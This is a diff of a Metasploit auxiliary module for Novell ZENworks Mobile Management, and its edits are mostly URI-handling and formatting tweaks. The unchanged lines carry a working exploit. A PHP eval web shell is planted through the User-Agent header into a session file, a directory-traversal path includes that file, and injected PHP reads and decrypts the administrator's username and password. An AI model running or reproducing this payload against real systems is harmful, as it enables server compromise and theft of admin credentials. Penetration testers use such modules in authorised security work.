@@ -33,8 +33,7 @@ class Metasploit3 < Msf::Auxiliary
 		)
 
 		register_options([
-			OptString.new('TARGETURI', [true, 'Path to the Novell Zenworks MDM install', '/']),
-			OptInt.new('RPORT', [true, "Default remote port", 80])
+			OptString.new('TARGETURI', [true, 'Path to the Novell Zenworks MDM install', '/'])
 		], self.class)
 
 		register_advanced_options([
@@ -48,9 +47,9 @@ class Metasploit3 < Msf::Auxiliary
 		res = send_request_cgi({
 			'agent' => "<?php echo(eval($_GET['#{cmd}'])); ?>",
 			'method' => "HEAD",
-			'uri' => normalize_uri("#{target_uri.path}/download.php"),
+			'uri' => normalize_uri("#{target_uri.path}", "download.php"),
 			'headers' => {"Cookie" => "PHPSESSID=#{sess}"},
-			}) 
+		}) 
 		return sess,cmd
 	end
 
@@ -58,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 		
 		res = send_request_cgi({
 			'method' => 'GET',
-			'uri' => normalize_uri("#{target_uri.path}/DUSAP.php"),
+			'uri' => normalize_uri("#{target_uri.path}", "DUSAP.php"),
 			'vars_get' => {
 				'language' => "res/languages/../../../../php/temp/sess_#{session_id}",
 				cmd_var => '$pass=mdm_ExecuteSQLQuery("SELECT UserName,Password FROM Administrators where AdministratorSAKey = 1",array(),false,-1,"","","",QUERY_TYPE_SELECT);echo "".$pass[0]["UserName"].":".mdm_DecryptData($pass[0]["Password"])."";'
@@ -71,11 +70,13 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		print_status("Verifying that Zenworks login page exists at #{ip}")
 		uri = normalize_uri(target_uri.path)
+
 		begin
 			res = send_request_raw({
 				'method' => 'GET',
 				'uri' => uri
-				})
+			})
+
 			if (res and res.code == 200 and res.body.to_s.match(/ZENworks Mobile Management User Self-Administration Portal/) != nil)
 				print_status("Found Zenworks MDM, Checking application version")
 				ver = res.body.to_s.match(/<p id="version">Version (.*)<\/p>/)[1]
